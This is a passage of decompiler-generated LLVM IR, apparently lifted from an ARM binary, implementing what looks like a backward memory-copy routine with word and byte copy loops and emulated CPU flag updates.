  store i32 %v12_175ec, i32* %v11_175ec, align 4
  store i32 %v1_175ec, i32* %r0.global-to-local, align 4
  %v0_175f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_175f0 = add i32 %v0_175f0, -4
  %v2_175f0 = inttoptr i32 %v1_175f0 to i32*
  %v3_175f0 = load i32, i32* %v2_175f0, align 4
  store i32 %v3_175f0, i32* @r3, align 4
  %v4_175f0 = add i32 %v0_175f0, -8
  %v5_175f0 = inttoptr i32 %v4_175f0 to i32*
  %v6_175f0 = load i32, i32* %v5_175f0, align 4
  store i32 %v6_175f0, i32* %r4.global-to-local, align 4
  %v7_175f0 = add i32 %v0_175f0, -12
  %v8_175f0 = inttoptr i32 %v7_175f0 to i32*
  %v9_175f0 = load i32, i32* %v8_175f0, align 4
  store i32 %v9_175f0, i32* @ip, align 4
  %v10_175f0 = add i32 %v0_175f0, -16
  %v11_175f0 = inttoptr i32 %v10_175f0 to i32*
  %v12_175f0 = load i32, i32* %v11_175f0, align 4
  store i32 %v12_175f0, i32* %lr.global-to-local, align 4
  store i32 %v10_175f0, i32* %r1.global-to-local, align 4
  %v1_175f4 = add i32 %v0_175ec, -32
  %v2_175f4 = inttoptr i32 %v1_175f4 to i32*
  store i32 %v3_175f0, i32* %v2_175f4, align 4
  %v4_175f4 = add i32 %v0_175ec, -28
  %v5_175f4 = inttoptr i32 %v4_175f4 to i32*
  %v6_175f4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_175f4, i32* %v5_175f4, align 4
  %v7_175f4 = add i32 %v0_175ec, -24
  %v8_175f4 = inttoptr i32 %v7_175f4 to i32*
  %v9_175f4 = load i32, i32* @ip, align 4
  store i32 %v9_175f4, i32* %v8_175f4, align 4
  %v10_175f4 = add i32 %v0_175ec, -20
  %v11_175f4 = inttoptr i32 %v10_175f4 to i32*
  %v12_175f4 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_175f4, i32* %v11_175f4, align 4
  store i32 %v1_175f4, i32* %r0.global-to-local, align 4
  %v0_175f8 = load i32, i32* %r2.global-to-local, align 4
  %v2_175f8 = add i32 %v0_175f8, -32
  store i32 %v2_175f8, i32* %r2.global-to-local, align 4
  %v6_175fc = icmp slt i32 %v0_175f8, 32
  br i1 %v6_175fc, label %dec_label_pc_17600.loopexit, label %dec_label_pc_175e8.dec_label_pc_175e8_crit_edge

dec_label_pc_175e8.dec_label_pc_175e8_crit_edge:  ; preds = %dec_label_pc_175e8
  %v0_175e8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_175e8

dec_label_pc_17600.loopexit:                      ; preds = %dec_label_pc_175e8
  %v4_175f8 = sub i32 31, %v0_175f8
  %v5_175f8 = and i32 %v4_175f8, %v0_175f8
  %v6_175f8 = icmp slt i32 %v5_175f8, 0
  %v7_175f8 = icmp slt i32 %v2_175f8, 0
  store i1 %v6_175f8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_175f8, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_17600

dec_label_pc_17600:                               ; preds = %dec_label_pc_17600.loopexit, %dec_label_pc_175dc
  %v6_17608 = phi i32 [ %v1_175f4, %dec_label_pc_17600.loopexit ], [ %v0_175ec37, %dec_label_pc_175dc ]
  %v0_17610.pr = phi i32 [ %v2_175f8, %dec_label_pc_17600.loopexit ], [ %v2_175e0, %dec_label_pc_175dc ]
  %v4_17600 = add i32 %v0_17610.pr, 16
  %v6_17600 = sub i32 0, %v0_17610.pr
  %v7_17600 = and i32 %v4_17600, %v6_17600
  %v8_17600 = icmp slt i32 %v7_17600, 0
  store i1 %v8_17600, i1* %cpsr_v.global-to-local, align 1
  %v9_17600 = icmp slt i32 %v4_17600, 0
  store i1 %v9_17600, i1* %cpsr_n.global-to-local, align 1
  %v10_17600 = icmp eq i32 %v4_17600, 0
  store i1 %v10_17600, i1* %cpsr_z.global-to-local, align 1
  %v5_17604 = icmp slt i32 %v0_17610.pr, -16
  br i1 %v5_17604, label %.thread2, label %bb147

bb147:                                            ; preds = %dec_label_pc_17600
  %v6_17604 = load i32, i32* %r1.global-to-local, align 4
  %v7_17604 = add i32 %v6_17604, -4
  %v8_17604 = inttoptr i32 %v7_17604 to i32*
  %v9_17604 = load i32, i32* %v8_17604, align 4
  store i32 %v9_17604, i32* @r3, align 4
  %v10_17604 = add i32 %v6_17604, -8
  %v11_17604 = inttoptr i32 %v10_17604 to i32*
  %v12_17604 = load i32, i32* %v11_17604, align 4
  store i32 %v12_17604, i32* %r4.global-to-local, align 4
  %v13_17604 = add i32 %v6_17604, -12
  %v14_17604 = inttoptr i32 %v13_17604 to i32*
  %v15_17604 = load i32, i32* %v14_17604, align 4
  store i32 %v15_17604, i32* @ip, align 4
  %v16_17604 = add i32 %v6_17604, -16
  %v17_17604 = inttoptr i32 %v16_17604 to i32*
  %v18_17604 = load i32, i32* %v17_17604, align 4
  store i32 %v18_17604, i32* %lr.global-to-local, align 4
  store i32 %v16_17604, i32* %r1.global-to-local, align 4
  %v7_17608 = add i32 %v6_17608, -16
  %v8_17608 = inttoptr i32 %v7_17608 to i32*
  store i32 %v9_17604, i32* %v8_17608, align 4
  %v10_17608 = add i32 %v6_17608, -12
  %v11_17608 = inttoptr i32 %v10_17608 to i32*
  %v12_17608 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_17608, i32* %v11_17608, align 4
  %v13_17608 = add i32 %v6_17608, -8
  %v14_17608 = inttoptr i32 %v13_17608 to i32*
  %v15_17608 = load i32, i32* @ip, align 4
  store i32 %v15_17608, i32* %v14_17608, align 4
  %v16_17608 = add i32 %v6_17608, -4
  %v17_17608 = inttoptr i32 %v16_17608 to i32*
  %v18_17608 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_17608, i32* %v17_17608, align 4
  store i32 %v7_17608, i32* %r0.global-to-local, align 4
  %v6_1760c = load i32, i32* %r2.global-to-local, align 4
  %v7_1760c = add i32 %v6_1760c, -16
  store i32 %v7_1760c, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_17600, %bb147
  %v6_17618 = phi i32 [ %v7_17608, %bb147 ], [ %v6_17608, %dec_label_pc_17600 ]
  %v0_17610 = phi i32 [ %v7_1760c, %bb147 ], [ %v0_17610.pr, %dec_label_pc_17600 ]
  %v4_17610 = add i32 %v0_17610, 20
  store i32 %v4_17610, i32* %r2.global-to-local, align 4
  %v6_17610 = sub i32 0, %v0_17610
  %v7_17610 = and i32 %v4_17610, %v6_17610
  %v8_17610 = icmp slt i32 %v7_17610, 0
  store i1 %v8_17610, i1* %cpsr_v.global-to-local, align 1
  %v9_17610 = icmp slt i32 %v4_17610, 0
  store i1 %v9_17610, i1* %cpsr_n.global-to-local, align 1
  %v10_17610 = icmp eq i32 %v4_17610, 0
  store i1 %v10_17610, i1* %cpsr_z.global-to-local, align 1
  %v5_17614 = icmp slt i32 %v0_17610, -20
  br i1 %v5_17614, label %.thread4, label %bb148

bb148:                                            ; preds = %.thread2
  %v6_17614 = load i32, i32* %r1.global-to-local, align 4
  %v7_17614 = add i32 %v6_17614, -4
  %v8_17614 = inttoptr i32 %v7_17614 to i32*
  %v9_17614 = load i32, i32* %v8_17614, align 4
  store i32 %v9_17614, i32* @r3, align 4
  %v10_17614 = add i32 %v6_17614, -8
  %v11_17614 = inttoptr i32 %v10_17614 to i32*
  %v12_17614 = load i32, i32* %v11_17614, align 4
  store i32 %v12_17614, i32* @ip, align 4
  %v13_17614 = add i32 %v6_17614, -12
  %v14_17614 = inttoptr i32 %v13_17614 to i32*
  %v15_17614 = load i32, i32* %v14_17614, align 4
  store i32 %v15_17614, i32* %lr.global-to-local, align 4
  store i32 %v13_17614, i32* %r1.global-to-local, align 4
  %v7_17618 = add i32 %v6_17618, -12
  %v8_17618 = inttoptr i32 %v7_17618 to i32*
  store i32 %v9_17614, i32* %v8_17618, align 4
  %v10_17618 = add i32 %v6_17618, -8
  %v11_17618 = inttoptr i32 %v10_17618 to i32*
  %v12_17618 = load i32, i32* @ip, align 4
  store i32 %v12_17618, i32* %v11_17618, align 4
  %v13_17618 = add i32 %v6_17618, -4
  %v14_17618 = inttoptr i32 %v13_17618 to i32*
  %v15_17618 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_17618, i32* %v14_17618, align 4
  store i32 %v7_17618, i32* %r0.global-to-local, align 4
  %v6_1761c = load i32, i32* %r2.global-to-local, align 4
  %v7_1761c = add i32 %v6_1761c, -12
  store i32 %v7_1761c, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread2, %bb148
  %v6_1763c45 = phi i32 [ %v6_17618, %.thread2 ], [ %v7_17618, %bb148 ]
  %v0_1762443 = phi i32 [ %v4_17610, %.thread2 ], [ %v7_1761c, %bb148 ]
  %v2_17620 = load i8*, i8** %stack_var_-8, align 4
  %v3_17620 = ptrtoint i8* %v2_17620 to i32
  store i32 %v3_17620, i32* @r4, align 4
  store i32 %v8_175dc, i32* @lr, align 4
  br label %dec_label_pc_17624

dec_label_pc_17624:                               ; preds = %dec_label_pc_175d4, %.thread4
  %v7_17634 = phi i32 [ %v0_175ec37, %dec_label_pc_175d4 ], [ %v6_1763c45, %.thread4 ]
  %v0_17624 = phi i32 [ %v2_175d4, %dec_label_pc_175d4 ], [ %v0_1762443, %.thread4 ]
  %v2_17624 = add i32 %v0_17624, 8
  store i32 %v2_17624, i32* %r2.global-to-local, align 4
  %v4_17624 = sub i32 0, %v0_17624
  %v5_17624 = and i32 %v2_17624, %v4_17624
  %v6_17624 = icmp slt i32 %v5_17624, 0
  store i1 %v6_17624, i1* %cpsr_v.global-to-local, align 1
  %v7_17624 = icmp slt i32 %v2_17624, 0
  store i1 %v7_17624, i1* %cpsr_n.global-to-local, align 1
  %v8_17624 = icmp eq i32 %v2_17624, 0
  store i1 %v8_17624, i1* %cpsr_z.global-to-local, align 1
  %v5_17628 = icmp slt i32 %v0_17624, -8
  br i1 %v5_17628, label %bb150, label %dec_label_pc_1762c

dec_label_pc_1762c:                               ; preds = %dec_label_pc_17624
  %v6_1762c = add i32 %v0_17624, 4
  store i32 %v6_1762c, i32* %r2.global-to-local, align 4
  %v8_1762c = sub i32 -5, %v0_17624
  %v9_1762c = and i32 %v8_1762c, %v2_17624
  %v10_1762c = icmp slt i32 %v9_1762c, 0
  store i1 %v10_1762c, i1* %cpsr_v.global-to-local, align 1
  %v11_1762c = icmp slt i32 %v6_1762c, 0
  store i1 %v11_1762c, i1* %cpsr_n.global-to-local, align 1
  %v12_1762c = icmp eq i32 %v2_17624, 4
  store i1 %v12_1762c, i1* %cpsr_z.global-to-local, align 1
  %v5_17630 = icmp slt i32 %v2_17624, 4
  %v6_17630 = load i32, i32* %r1.global-to-local, align 4
  %v7_17630 = add i32 %v6_17630, -4
  %v8_17630 = inttoptr i32 %v7_17630 to i32*
  %v9_17630 = load i32, i32* %v8_17630, align 4
  store i32 %v9_17630, i32* @r3, align 4
  br i1 %v5_17630, label %.thread8, label %bb149

.thread8:                                         ; preds = %dec_label_pc_1762c
  store i32 %v7_17630, i32* %r1.global-to-local, align 4
  %v8_17634 = add i32 %v7_17634, -4
  %v9_17634 = inttoptr i32 %v8_17634 to i32*
  store i32 %v9_17630, i32* %v9_17634, align 4
  %v10_17634 = load i32, i32* %r0.global-to-local, align 4
  %v11_17634 = add i32 %v10_17634, -4
  store i32 %v11_17634, i32* %r0.global-to-local, align 4
  %v0_17644.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb150

bb149:                                            ; preds = %dec_label_pc_1762c
  %v10_17638 = add i32 %v6_17630, -8
  %v11_17638 = inttoptr i32 %v10_17638 to i32*
  %v12_17638 = load i32, i32* %v11_17638, align 4
  store i32 %v12_17638, i32* @ip, align 4
  store i32 %v10_17638, i32* %r1.global-to-local, align 4
  %v7_1763c = add i32 %v7_17634, -8
  %v8_1763c = inttoptr i32 %v7_1763c to i32*
  store i32 %v9_17630, i32* %v8_1763c, align 4
  %v10_1763c = add i32 %v7_17634, -4
  %v11_1763c = inttoptr i32 %v10_1763c to i32*
  %v12_1763c = load i32, i32* @ip, align 4
  store i32 %v12_1763c, i32* %v11_1763c, align 4
  store i32 %v7_1763c, i32* %r0.global-to-local, align 4
  %v6_17640 = load i32, i32* %r2.global-to-local, align 4
  %v7_17640 = add i32 %v6_17640, -4
  store i32 %v7_17640, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %.thread8, %.thread14, %dec_label_pc_17624, %dec_label_pc_175b4, %dec_label_pc_177e8, %dec_label_pc_1777c, %dec_label_pc_17710, %bb149
  %v2_17648 = phi i32 [ %v11_17634, %.thread8 ], [ %v0_176e020, %.thread14 ], [ %v7_17634, %dec_label_pc_17624 ], [ %v2_175b8, %dec_label_pc_175b4 ], [ %v2_1765453, %dec_label_pc_177e8 ], [ %v2_1765452, %dec_label_pc_1777c ], [ %v2_1765451, %dec_label_pc_17710 ], [ %v7_1763c, %bb149 ]
  %v0_17644 = phi i32 [ %v0_17644.pre, %.thread8 ], [ %v2_17688, %.thread14 ], [ %v2_17624, %dec_label_pc_17624 ], [ %v2_175bc, %dec_label_pc_175b4 ], [ %v0_1764449, %dec_label_pc_177e8 ], [ %v0_1764448, %dec_label_pc_1777c ], [ %v0_1764447, %dec_label_pc_17710 ], [ %v7_17640, %bb149 ]
  %v1_17644 = add i32 %v0_17644, 4
  store i32 %v1_17644, i32* %r2.global-to-local, align 4
  %v3_17644 = sub i32 0, %v0_17644
  %v4_17644 = and i32 %v1_17644, %v3_17644
  %v5_17644 = icmp slt i32 %v4_17644, 0
  store i1 %v5_17644, i1* %cpsr_v.global-to-local, align 1
  %v6_17644 = icmp slt i32 %v1_17644, 0
  store i1 %v6_17644, i1* %cpsr_n.global-to-local, align 1
  %v7_17644 = icmp eq i32 %v1_17644, 0
  store i1 %v7_17644, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17644, label %.thread130, label %bb151

bb151:                                            ; preds = %bb150
  %v1_1764c = add i32 %v0_17644, 2
  %v3_1764c = sub i32 -3, %v0_17644
  %v4_1764c = and i32 %v3_1764c, %v1_17644
  %v5_1764c = icmp slt i32 %v4_1764c, 0
  store i1 %v5_1764c, i1* %cpsr_v.global-to-local, align 1
  %v6_1764c = icmp slt i32 %v1_1764c, 0
  store i1 %v6_1764c, i1* %cpsr_n.global-to-local, align 1
  %v7_1764c = icmp eq i32 %v1_17644, 2
  store i1 %v7_1764c, i1* %cpsr_z.global-to-local, align 1
  %v0_17650 = load i32, i32* %r1.global-to-local, align 4
  %v1_17650 = add i32 %v0_17650, -1
  %v2_17650 = inttoptr i32 %v1_17650 to i8*
  %v3_17650 = load i8, i8* %v2_17650, align 1
  %v4_17650 = zext i8 %v3_17650 to i32
  store i32 %v4_17650, i32* @r3, align 4
  store i32 %v1_17650, i32* %r1.global-to-local, align 4
  %v3_17654 = add i32 %v2_17648, -1
  %v4_17654 = inttoptr i32 %v3_17654 to i8*
  store i8 %v3_17650, i8* %v4_17654, align 1
  %v5_17654 = load i32, i32* %r0.global-to-local, align 4
  %v6_17654 = add i32 %v5_17654, -1
  store i32 %v6_17654, i32* %r0.global-to-local, align 4
  %v0_17658 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_17658 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_17658 = xor i1 %v0_17658, %v1_17658
  br i1 %v2_17658, label %.thread129, label %bb152

bb152:                                            ; preds = %bb151
  %v3_17658 = load i32, i32* %r1.global-to-local, align 4
  %v4_17658 = add i32 %v3_17658, -1
  %v5_17658 = inttoptr i32 %v4_17658 to i8*
  %v6_17658 = load i8, i8* %v5_17658, align 1
  %v7_17658 = zext i8 %v6_17658 to i32
  store i32 %v7_17658, i32* @r3, align 4
  store i32 %v4_17658, i32* %r1.global-to-local, align 4
  %v6_1765c = add i32 %v5_17654, -2
  %v7_1765c = inttoptr i32 %v6_1765c to i8*
  store i8 %v6_17658, i8* %v7_1765c, align 1
  %v8_1765c = load i32, i32* %r0.global-to-local, align 4
  %v9_1765c = add i32 %v8_1765c, -1
  store i32 %v9_1765c, i32* %r0.global-to-local, align 4
  %v1_17660.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_17660.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread129

.thread129:                                       ; preds = %bb151, %bb152
  %v7_17664 = phi i32 [ %v9_1765c, %bb152 ], [ %v6_17654, %bb151 ]
  %v2_17664 = phi i1 [ %v2_17660.pre, %bb152 ], [ %v1_17658, %bb151 ]
  %v1_17664 = phi i1 [ %v1_17660.pre, %bb152 ], [ %v0_17658, %bb151 ]
  %v0_17660 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_17660 = xor i1 %v2_17664, %v1_17664
  %v4_17660 = or i1 %v0_17660, %v3_17660
  br i1 %v4_17660, label %.thread130, label %bb153

bb153:                                            ; preds = %.thread129
  %v5_17660 = load i32, i32* %r1.global-to-local, align 4
  %v6_17660 = add i32 %v5_17660, -1
  %v7_17660 = inttoptr i32 %v6_17660 to i8*
  %v8_17660 = load i8, i8* %v7_17660, align 1
  %v9_17660 = zext i8 %v8_17660 to i32
  store i32 %v9_17660, i32* @r3, align 4
  store i32 %v6_17660, i32* %r1.global-to-local, align 4
  %v8_17664 = add i32 %v7_17664, -1
  %v9_17664 = inttoptr i32 %v8_17664 to i8*
  store i8 %v8_17660, i8* %v9_17664, align 1
  %v10_17664 = load i32, i32* %r0.global-to-local, align 4
  %v11_17664 = add i32 %v10_17664, -1
  store i32 %v11_17664, i32* %r0.global-to-local, align 4
  br label %.thread130

dec_label_pc_1766c:                               ; preds = %dec_label_pc_175c4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_1766c = icmp eq i32 %v1_175c4, 1
  store i1 %v8_1766c, i1* %cpsr_n.global-to-local, align 1
  %v9_1766c = icmp eq i32 %v1_175c4, 2
  store i1 %v9_1766c, i1* %cpsr_z.global-to-local, align 1
  %v1_17670 = add i32 %v2_175b4, -1
  %v2_17670 = inttoptr i32 %v1_17670 to i8*
  %v3_17670 = load i8, i8* %v2_17670, align 1
  %v4_17670 = zext i8 %v3_17670 to i32
  store i32 %v4_17670, i32* @r3, align 4
  store i32 %v1_17670, i32* %r1.global-to-local, align 4
  %v3_17674 = add i32 %v2_175b8, -1
  %v4_17674 = inttoptr i32 %v3_17674 to i8*
  store i8 %v3_17670, i8* %v4_17674, align 1
  %v5_17674 = load i32, i32* %r0.global-to-local, align 4
  %v6_17674 = add i32 %v5_17674, -1
  store i32 %v6_17674, i32* %r0.global-to-local, align 4
  br i1 %v8_1766c, label %.thread14, label %bb154

bb154:                                            ; preds = %dec_label_pc_1766c
  %v6_17678 = load i32, i32* %r1.global-to-local, align 4
  %v7_17678 = add i32 %v6_17678, -1
  %v8_17678 = inttoptr i32 %v7_17678 to i8*
  %v9_17678 = load i8, i8* %v8_17678, align 1
  %v10_17678 = zext i8 %v9_17678 to i32
  store i32 %v10_17678, i32* @r3, align 4
  store i32 %v7_17678, i32* %r1.global-to-local, align 4
  %v9_1767c = add i32 %v5_17674, -2
  %v10_1767c = inttoptr i32 %v9_1767c to i8*
  store i8 %v9_17678, i8* %v10_1767c, align 1
  %v11_1767c = load i32, i32* %r0.global-to-local, align 4
  %v12_1767c = add i32 %v11_1767c, -1
  store i32 %v12_1767c, i32* %r0.global-to-local, align 4
  br i1 %v9_1766c, label %.thread14, label %bb155

bb155:                                            ; preds = %bb154
  %v8_17680 = load i32, i32* %r1.global-to-local, align 4
  %v9_17680 = add i32 %v8_17680, -1
  %v10_17680 = inttoptr i32 %v9_17680 to i8*
  %v11_17680 = load i8, i8* %v10_17680, align 1
  %v12_17680 = zext i8 %v11_17680 to i32
  store i32 %v12_17680, i32* @r3, align 4
  store i32 %v9_17680, i32* %r1.global-to-local, align 4
  %v11_17684 = add i32 %v11_1767c, -2
  %v12_17684 = inttoptr i32 %v11_17684 to i8*
  store i8 %v11_17680, i8* %v12_17684, align 1
  %v13_17684 = load i32, i32* %r0.global-to-local, align 4
  %v14_17684 = add i32 %v13_17684, -1
  store i32 %v14_17684, i32* %r0.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %bb154, %dec_label_pc_1766c, %bb155
  %v0_176e020 = phi i32 [ %v12_1767c, %bb154 ], [ %v6_17674, %dec_label_pc_1766c ], [ %v14_17684, %bb155 ]
  %v0_17688 = load i32, i32* %r2.global-to-local, align 4
  %v1_17688 = load i32, i32* @ip, align 4
  %v2_17688 = sub i32 %v0_17688, %v1_17688
  store i32 %v2_17688, i32* %r2.global-to-local, align 4
  %v4_17688 = xor i32 %v1_17688, %v0_17688
  %v5_17688 = xor i32 %v2_17688, %v0_17688
  %v6_17688 = and i32 %v5_17688, %v4_17688
  %v7_17688 = icmp slt i32 %v6_17688, 0
  store i1 %v7_17688, i1* %cpsr_v.global-to-local, align 1
  %v8_17688 = icmp slt i32 %v2_17688, 0
  store i1 %v8_17688, i1* %cpsr_n.global-to-local, align 1
  %v9_17688 = icmp eq i32 %v0_17688, %v1_17688
  store i1 %v9_17688, i1* %cpsr_z.global-to-local, align 1
  %v5_1768c = icmp slt i32 %v0_17688, %v1_17688
  br i1 %v5_1768c, label %bb150, label %dec_label_pc_17690

dec_label_pc_17690:                               ; preds = %.thread14
  %v0_17690 = load i32, i32* %r1.global-to-local, align 4
  %v1_17690 = urem i32 %v0_17690, 4
  store i32 %v1_17690, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_17690 = icmp eq i32 %v1_17690, 0
  store i1 %v2_17690, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17690, label %dec_label_pc_175d4, label %dec_label_pc_17698

dec_label_pc_17698:                               ; preds = %dec_label_pc_175cc, %dec_label_pc_17690
  %v0_176e019 = phi i32 [ %v2_175b8, %dec_label_pc_175cc ], [ %v0_176e020, %dec_label_pc_17690 ]
  %v0_1778c = phi i32 [ %v2_175bc, %dec_label_pc_175cc ], [ %v2_17688, %dec_label_pc_17690 ]
  %v0_17698 = phi i32 [ %v2_175b4, %dec_label_pc_175cc ], [ %v0_17690, %dec_label_pc_17690 ]
  %v0_176a0 = phi i32 [ %v1_175cc, %dec_label_pc_175cc ], [ %v1_17690, %dec_label_pc_17690 ]
  %v1_17698 = and i32 %v0_17698, -4
  store i32 %v1_17698, i32* %r1.global-to-local, align 4
  %v1_1769c = inttoptr i32 %v1_17698 to i32*
  %v2_1769c = load i32, i32* %v1_1769c, align 4
  store i32 %v2_1769c, i32* @r3, align 4
  %v7_176a0 = icmp ult i32 %v0_176a0, 2
  %v2_17784 = add i32 %v0_1778c, -12
  %v4_17784 = sub i32 11, %v0_1778c
  %v5_17784 = and i32 %v4_17784, %v0_1778c
  %v6_17784 = icmp slt i32 %v5_17784, 0
  store i1 %v6_17784, i1* %cpsr_v.global-to-local, align 1
  %v7_17784 = icmp slt i32 %v2_17784, 0
  store i1 %v7_17784, i1* %cpsr_n.global-to-local, align 1
  %v8_17784 = icmp eq i32 %v0_1778c, 12
  store i1 %v8_17784, i1* %cpsr_z.global-to-local, align 1
  %v5_17788 = icmp slt i32 %v0_1778c, 12
  br i1 %v7_176a0, label %dec_label_pc_17784, label %dec_label_pc_176a8

dec_label_pc_176a8:                               ; preds = %dec_label_pc_17698
  %v8_176a0 = icmp eq i32 %v0_176a0, 2
  br i1 %v8_176a0, label %dec_label_pc_17718, label %dec_label_pc_176ac

dec_label_pc_176ac:                               ; preds = %dec_label_pc_176a8
  br i1 %v5_17788, label %dec_label_pc_176f8, label %dec_label_pc_176b4

dec_label_pc_176b4:                               ; preds = %dec_label_pc_176ac
  store i32 %v2_17784, i32* %r2.global-to-local, align 4
  %v3_176b8 = load i32, i32* @r4, align 4
  store i32 %v3_176b8, i32* %stack_var_-12, align 4
  %v6_176b8 = load i32, i32* @r5, align 4
  %v8_176b8 = inttoptr i32 %v6_176b8 to i8*
  store i8* %v8_176b8, i8** %stack_var_-8, align 4
  %v11_176b8 = load i32, i32* @lr, align 4
  br label %dec_label_pc_176bc

dec_label_pc_176bc:                               ; preds = %dec_label_pc_176bc.dec_label_pc_176bc_crit_edge, %dec_label_pc_176b4
  %v0_176e0 = phi i32 [ %v1_176e0, %dec_label_pc_176bc.dec_label_pc_176bc_crit_edge ], [ %v0_176e019, %dec_label_pc_176b4 ]
  %v0_176c0 = phi i32 [ %v0_176c0.pre, %dec_label_pc_176bc.dec_label_pc_176bc_crit_edge ], [ %v1_17698, %dec_label_pc_176b4 ]
  %v0_176bc = phi i32 [ %v0_176bc.pre, %dec_label_pc_176bc.dec_label_pc_176bc_crit_edge ], [ %v2_1769c, %dec_label_pc_176b4 ]
  %v3_176bc = mul i32 %v0_176bc, 256
  store i32 %v3_176bc, i32* %lr.global-to-local, align 4
  %v1_176c0 = add i32 %v0_176c0, -4
  %v2_176c0 = inttoptr i32 %v1_176c0 to i32*
  %v3_176c0 = load i32, i32* %v2_176c0, align 4
  store i32 %v3_176c0, i32* @r3, align 4
  %v4_176c0 = add i32 %v0_176c0, -8
  %v5_176c0 = inttoptr i32 %v4_176c0 to i32*
  %v6_176c0 = load i32, i32* %v5_176c0, align 4
  store i32 %v6_176c0, i32* %r4.global-to-local, align 4
  %v7_176c0 = add i32 %v0_176c0, -12
  %v8_176c0 = inttoptr i32 %v7_176c0 to i32*
  %v9_176c0 = load i32, i32* %v8_176c0, align 4
  store i32 %v9_176c0, i32* %r5.global-to-local, align 4
  %v10_176c0 = add i32 %v0_176c0, -16
  %v11_176c0 = inttoptr i32 %v10_176c0 to i32*
  %v12_176c0 = load i32, i32* %v11_176c0, align 4
  store i32 %v10_176c0, i32* %r1.global-to-local, align 4
  %v4_176c4 = udiv i32 %v12_176c0, 16777216
  %v5_176c4 = or i32 %v4_176c4, %v3_176bc
  store i32 %v5_176c4, i32* %lr.global-to-local, align 4
  %v3_176c8 = mul i32 %v12_176c0, 256
  %v4_176cc = udiv i32 %v9_176c0, 16777216
  %v5_176cc = or i32 %v3_176c8, %v4_176cc
  store i32 %v5_176cc, i32* @ip, align 4
  %v3_176d0 = mul i32 %v9_176c0, 256
  %v4_176d4 = udiv i32 %v6_176c0, 16777216
  %v5_176d4 = or i32 %v3_176d0, %v4_176d4
  store i32 %v5_176d4, i32* %r5.global-to-local, align 4
  %v3_176d8 = mul i32 %v6_176c0, 256
  %v4_176dc = udiv i32 %v3_176c0, 16777216
  %v5_176dc = or i32 %v3_176d8, %v4_176dc
  store i32 %v5_176dc, i32* %r4.global-to-local, align 4
  %v1_176e0 = add i32 %v0_176e0, -16
  %v2_176e0 = inttoptr i32 %v1_176e0 to i32*
  store i32 %v5_176dc, i32* %v2_176e0, align 4
  %v4_176e0 = add i32 %v0_176e0, -12
  %v5_176e0 = inttoptr i32 %v4_176e0 to i32*
  %v6_176e0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_176e0, i32* %v5_176e0, align 4
  %v7_176e0 = add i32 %v0_176e0, -8
  %v8_176e0 = inttoptr i32 %v7_176e0 to i32*
  %v9_176e0 = load i32, i32* @ip, align 4
  store i32 %v9_176e0, i32* %v8_176e0, align 4
  %v10_176e0 = add i32 %v0_176e0, -4
  %v11_176e0 = inttoptr i32 %v10_176e0 to i32*
  %v12_176e0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_176e0, i32* %v11_176e0, align 4
  store i32 %v1_176e0, i32* %r0.global-to-local, align 4
  %v0_176e4 = load i32, i32* %r2.global-to-local, align 4
  %v2_176e4 = add i32 %v0_176e4, -16
  store i32 %v2_176e4, i32* %r2.global-to-local, align 4
  %v6_176e8 = icmp slt i32 %v0_176e4, 16
  br i1 %v6_176e8, label %dec_label_pc_176ec, label %dec_label_pc_176bc.dec_label_pc_176bc_crit_edge

dec_label_pc_176bc.dec_label_pc_176bc_crit_edge:  ; preds = %dec_label_pc_176bc
  %v0_176bc.pre = load i32, i32* @r3, align 4
  %v0_176c0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_176bc

dec_label_pc_176ec:                               ; preds = %dec_label_pc_176bc
  %v2_176ec = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_176ec, i32* @r4, align 4
  %v5_176ec = load i8*, i8** %stack_var_-8, align 4
  %v6_176ec = ptrtoint i8* %v5_176ec to i32
  store i32 %v6_176ec, i32* @r5, align 4
  store i32 %v11_176b8, i32* @lr, align 4
  %v2_176f0 = add i32 %v0_176e4, -4
  store i32 %v2_176f0, i32* %r2.global-to-local, align 4
  %v4_176f0 = add i32 %v0_176e4, 2147483632
  %v5_176f0 = and i32 %v2_176f0, %v4_176f0
  %v6_176f0 = icmp slt i32 %v5_176f0, 0
  store i1 %v6_176f0, i1* %cpsr_v.global-to-local, align 1
  %v7_176f0 = icmp slt i32 %v2_176f0, 0
  store i1 %v7_176f0, i1* %cpsr_n.global-to-local, align 1
  %v8_176f0 = icmp eq i32 %v2_176f0, 0
  store i1 %v8_176f0, i1* %cpsr_z.global-to-local, align 1
  %v5_176f4 = icmp slt i32 %v2_176e4, -12
  br i1 %v5_176f4, label %dec_label_pc_17710, label %dec_label_pc_176f8

dec_label_pc_176f8:                               ; preds = %dec_label_pc_176ec, %dec_label_pc_176ac, %dec_label_pc_176f8
  %v1_17704 = phi i32 [ %v5_17704, %dec_label_pc_176f8 ], [ %v1_176e0, %dec_label_pc_176ec ], [ %v0_176e019, %dec_label_pc_176ac ]
  %v0_176f8 = load i32, i32* @r3, align 4
  %v3_176f8 = mul i32 %v0_176f8, 256
  store i32 %v3_176f8, i32* %ip.global-to-local, align 4
